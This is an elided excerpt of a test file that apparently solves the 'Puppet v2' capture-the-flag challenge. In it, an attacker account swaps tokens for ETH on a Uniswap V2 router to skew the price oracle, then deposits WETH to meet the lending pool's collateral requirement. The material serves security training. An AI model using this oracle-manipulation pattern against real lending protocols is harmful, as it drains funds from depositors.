...
describe('[Challenge] Puppet v2', function () {
  ...
  before(async function () {
    ...
    this.uniswapExchange = UniswapPairFactory.attach(
  ...
  it('Exploit', async function () {
    ...
    // expected to get 9.90069513406156901688 ETH just like last time. (.05% protocol fee + .25% LP's cut = 0.3% trading fee)
    // https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02
    let tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
      ...
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline)
      { gasLimit: 1e6 }
    ); // spent so much time because I wrote 'swapExactTokensForEth' instead of 'swapExactTokensForETH', was getting the error 'this.uni... is not a function' however as invalid arguments were caught, I thought function name to be correct.
    ...
    await this.weth.connect(attacker).deposit({
      value: await this.lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      ),
    });
    ...
    console.log(
      "Attacker's Eth balance after deposit:",
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address)
      )
    );
